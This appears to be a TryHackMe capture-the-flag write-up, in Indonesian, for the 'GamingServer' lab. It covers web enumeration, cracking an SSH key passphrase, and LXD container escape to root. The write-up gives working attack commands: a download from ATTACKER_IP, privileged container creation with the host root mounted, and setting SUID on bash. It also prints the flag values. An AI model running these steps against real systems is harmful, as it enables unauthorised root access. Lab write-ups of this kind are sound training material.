# GamingServer — TryHackMe Writeup

**Target:** GamingServer  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Kategori:** Web, SSH, Privilege Escalation  

---

## Recon

```
22/tcp  open  ssh   OpenSSH 7.6p1 Ubuntu
80/tcp  open  http  Apache httpd 2.4.29 (Ubuntu)
```

Website masih under development, sebagian besar konten lorem ipsum.

---

## Enumerasi Web

### Source Code

```bash
curl http://TARGET
```

Ditemukan komentar HTML:

```
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

Kandidat username: `john`

### robots.txt

```bash
curl http://TARGET/robots.txt
```

```
user-agent: *
Allow: /
/uploads/
```

### /uploads

Direktori `/uploads` berisi dua file menarik:

- `manifesto.txt` — The Hacker Manifesto (tidak relevan)
- `dict.lst` — custom wordlist

### Directory Brute Force

Menggunakan wordlist dari target itu sendiri:

```bash
gobuster dir -u http://TARGET -w dict.lst
```

Ditemukan RSA private key terenkripsi.

---

## Initial Access — SSH via Cracked RSA Key

### Crack Passphrase

Konversi key ke format hash lalu crack menggunakan john:

```bash
ssh2john id_rsa > hash.txt
john --wordlist=dict.lst hash.txt
```

Hasil:

```
letmein  (id_rsa)
```

### Login SSH

```bash
ssh -i id_rsa john@TARGET
# passphrase: letmein
```

### User Flag

```bash
cat user.txt
# a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

---

## Privilege Escalation — LXD Container Escape

### Enumerasi

```bash
id
# uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

User `john` berada di group `lxd` — vector privilege escalation via container escape.

```bash
sudo -l
# butuh password, tidak bisa digunakan
```

### Kenapa LXD Berbahaya

Container yang dibuat dengan flag `security.privileged=true` berjalan sebagai root dan dapat mengakses seluruh filesystem host. Dengan me-mount `/` host ke dalam container, attacker dapat memodifikasi file sistem host sebagai root.

### Build Alpine Image

LXC image list kosong dan download langsung dari internet gagal (404). Image dibangun secara lokal di mesin attacker menggunakan `lxd-alpine-builder`:

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine -a i686
```

Flag `-a i686` diperlukan karena arsitektur target adalah `aarch64` yang tidak didukung builder secara default.

Output: `alpine-v3.x-i686.tar.gz`

### Transfer Image ke Target

Di mesin attacker:

```bash
python3 -m http.server 8000
```

Di target:

```bash
cd /tmp
wget http://ATTACKER_IP:8000/alpine-v3*.tar.gz
```

### Exploit

Import image:

```bash
lxc image import alpine-v3*.tar.gz --alias alpine
lxc image list
```

Buat container privileged dan mount root host:

```bash
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
```

Masuk container dan set SUID pada bash host:

```bash
lxc exec privesc /bin/sh
chmod +s /mnt/root/bin/bash
exit
```

Jalankan bash dengan privilege root:

```bash
/bin/bash -p
id
# uid=1000(john) euid=0(root)
```

### Root Flag

```bash
cat /root/root.txt
# 2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

---

## Ringkasan

| Fase           | Teknik                                          |
|----------------|-------------------------------------------------|
| Recon          | Nmap, source code analysis, robots.txt          |
| Enumerasi      | Gobuster dengan custom wordlist dari target      |
| Initial Access | Crack RSA key passphrase → SSH login            |
| PrivEsc        | LXD container escape → SUID bash               |
| Flag           | user + root ✅                                  |

## Takeaway

Dua poin penting dari room ini. Pertama, wordlist yang ditemukan di target itu sendiri bisa digunakan untuk enumerasi lebih lanjut — resource dari target adalah petunjuk yang intentional. Kedua, membership di group `lxd` atau `docker` adalah red flag privesc yang harus dicek segera setelah `id` dan `sudo -l`. Container privileged dengan akses mount ke filesystem host setara dengan akses root penuh.

